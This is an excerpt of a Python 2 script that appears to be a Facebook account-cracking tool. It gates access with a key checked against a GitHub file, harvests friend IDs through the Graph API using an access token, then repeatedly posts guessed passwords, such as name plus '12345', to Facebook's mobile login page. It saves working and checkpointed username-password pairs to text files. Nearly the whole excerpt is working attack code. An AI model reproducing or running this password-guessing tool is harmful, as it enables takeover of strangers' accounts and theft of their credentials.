...
def main_apv():
    ...
    try:
        key1 = open('/sdcard/.landkheli.txt', 'r').read()
    except IOError:
        os.system('clear')
        print logo
        print 40 * '-'
        ...
        kok = open('/sdcard/.landkheli.txt', 'w')
        kok.write(myid + imt)
        kok.close()
        print ''
        print ''
    ...
    r1 = requests.get('https://raw.githubusercontent.com/N00B-D3C0MP1L3R/Raja-Landkheli/main/Fuck.txt').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
...
def main_input():
    ...
    if mx == '2':
        ...
        print '\x1b[1;92m        Member In Landkheli Paid Commands '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[LANBAJA-OK] ' + coc + user + ' | ' + pass1
                ok = open('random-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[LANBAJA-CP] ' + coc + user + ' | ' + pass1
...
def mineExt():
    ...
    my_line = file.readline()
    count.append(my_line)
    print g + '[=] Extracting From LANBAJA : ' + my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck = open('jok.txt', 'a')
    for i in z['data']:
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[ILANBAJA-OK] ' + uid + ' | ' + pass1
                ok = open('LANBAJA-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[LANBAJA-CP] ' + uid + ' | ' + pass1
                cp = open('LANBAJA-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                    ...
                    'login': 'submit' })
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[LANBAJA-OK] ' + uid + ' | ' + pass2
                    ok = open('LANBAJA-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[LANBAJA-CP] ' + uid + ' | ' + pass2
                    cp = open('LANBAJA-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data = {
                        ...
                        'login': 'submit' })
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[LANBAJA-OK] ' + uid + ' | ' + pass3
                        ok = open('LANBAJA-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[LANBAJA-CP] ' + uid + ' | ' + pass3
                        cp = open('LANBAJA-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data = {
                            ...
                            'login': 'submit' })
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[LANBAJA-OK] ' + uid + ' | ' + pass4
                            ok = open('LANBAJA-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[ILANBAJA-CP] ' + uid + ' | ' + pass4
                            cp = open('LANBAJA-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                ...
                                'login': 'submit' })
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[LANBAJA-OK] ' + uid + ' | ' + pass5
                                ok = open('LANBAJA-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[LANBAJA-CP] ' + uid + ' | ' + pass5
                                cp = open('LANBAJA-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[LANBAJA-OK] ' + uid + ' | ' + pass1
                ok = open('LANBAJA-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
...
def c_f_p_pass():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[LANBAJA-OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/LANBAJA-OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[LANBAJA-CP] ' + uid + ' | ' + pass1
                cp = open('/sdcard/LANBAJA-CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            pass2 = name + '12345'
